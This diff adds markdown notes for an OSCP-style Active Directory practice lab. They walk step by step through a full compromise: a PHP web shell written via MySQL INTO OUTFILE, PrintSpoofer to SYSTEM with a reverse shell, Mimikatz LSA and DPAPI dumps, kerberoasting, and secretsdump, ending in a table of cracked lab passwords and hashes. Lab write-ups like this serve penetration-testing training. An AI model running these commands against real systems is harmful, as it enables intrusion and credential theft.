@@ -1,0 +1,89 @@
+# OSCPA-AD: Set Notes
+
+## Domain Information
+- **Domain**: `oscp.exam`
+- **DC**: `DC01.oscp.exam` (10.10.123.140)
+- **Hosts**:
+  - `MS01` (192.168.163.141 / 10.10.123.141)
+  - `MS02` (10.10.123.142)
+
+## Initial Foothold (MS01)
+
+### Recon
+- **Nmap Scan**:
+  ```bash
+  proxychains nmap -sT -p- --min-rate 1000 10.10.123.141
+  ```
+- **Ports**: 22 (SSH), 80/81 (Apache PHP), 3306 (MySQL), 3307 (MariaDB), 445 (SMB), 5985 (WinRM).
+- **Users Found**: `eric.wallows`, `celia.almeda`, `Mary.Williams`, `web_svc`, `support`.
+- **Credentials**: `eric.wallows` : `EricLikesRunning800`
+
+### MySQL to RCE
+- **Port Forwarding (SSH Tunnel)**:
+  ```bash
+  ssh -L 3307:127.0.0.1:3307 eric.wallows@192.168.163.141
+  ```
+- **Login**: `mysql -h 127.0.0.1 -P 3307 -u root -p`
+- **Vulnerability**: `file_priv = 'Y'` and `secure_file_priv` is empty.
+- **Exploitation**:
+  ```sql
+  SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/wamp64/www/shell.php';
+  ```
+- **Access**: `curl "http://192.168.163.141/shell.php?cmd=whoami"` -> `ms01\mary.williams`
+
+## Privilege Escalation (MS01)
+
+### MS01 to SYSTEM
+- **Indicator**: `SeImpersonatePrivilege` enabled for `mary.williams`.
+- **Exploit**: `PrintSpoofer.exe`
+- **Command**:
+  ```bash
+  curl "http://192.168.163.141/shell.php?cmd=C:\tmp\PrintSpoofer.exe -i -c \"powershell -nop -c [Reverse_Shell_Code]\""
+  ```
+- **Result**: SYSTEM shell on MS01.
+
+### Credential Harvesting (Mimikatz)
+- **Command**: `.\mimikatz.exe "token::elevate" "lsadump::secrets" "exit"`
+- **LSA Secrets**: 
+  - `DefaultPassword` : `7k8XHk3dMtmpnC7` (for `celia.almeda`)
+  - `_SC_wampapache64` : `69jHwjGN2bPQFvJ` (for `Mary.Williams`)
+- **SAM Hashes**:
+  - `Administrator` : `3c4495bbd678fac8c9d218be4f2bbc7b` -> `December31`
+  - `support` : `d9358122015c5b159574a88b3c0d2071` -> `Freedom1`
+
+## Lateral Movement / Pivot
+
+### Kerberoasting (Rubeus)
+- **Execution**: `rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt`
+- **Cracking**: `john --format=krb5tgs kerb.txt --wordlist=/usr/share/wordlists/rockyou.txt`
+- **Results**:
+  - `sql_svc` : `Diamond1`
+  - `web_svc` : `Diamond1`
+
+### MS02 (10.10.123.142)
+- **SMB Enumeration**: `proxychains smbmap -H 10.10.123.142 -u web_svc -p Diamond1 -d oscp.exam`
+- **MSSQL Access**: `proxychains impacket-mssqlclient oscp.exam/web_svc:Diamond1@10.10.123.142 -windows-auth`
+- **DPAPI Extraction**:
+  ```powershell
+  $masterkey = [IO.File]::ReadAllBytes('C:\Users\celia.almeda\AppData\Roaming\Microsoft\Protect\...\ed3fcd49...')
+  .\mimikatz.exe "dpapi::cred /in:C:\Users\celia.almeda\AppData\Local\Microsoft\Credentials\... /masterkey:[HEX]" "exit"
+  ```
+
+### DC01 (10.10.123.140)
+- **SID Brute Force**: `proxychains impacket-lookupsid oscp.exam/web_svc:Diamond1@10.10.123.140`
+- **BloodHound**: `proxychains bloodhound-python -d oscp.exam -u celia.almeda -p 7k8XHk3dMtmpnC7 -ns 10.10.123.140 -c All --dns-tcp`
+- **Backup Recovery**: `download SAM`, `download SYSTEM` from `c:\windows.old\Windows\System32`.
+- **SAM Dump**: `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`
+- **Result**: `tom_admin` NTLM `4979d69d4ca66955c075c41cf45f24dc`.
+
+## Final Credentials Summary
+| User | Password / Hash | Source |
+| :--- | :--- | :--- |
+| `eric.wallows` | `EricLikesRunning800` | Recon |
+| `celia.almeda` | `7k8XHk3dMtmpnC7` | LSA Secrets (AutoLogon) |
+| `Mary.Williams` | `69jHwjGN2bPQFvJ` | LSA Secrets (Service) |
+| `web_svc` | `Diamond1` | Kerberoast |
+| `sql_svc` | `Diamond1` | Kerberoast |
+| `support` | `Freedom1` | SAM Crack |
+| `Administrator` | `December31` | SAM Crack |
+| `tom_admin` | `4979d69d4ca66955c075c41cf45f24dc` | Backup SAM (windows.old) |
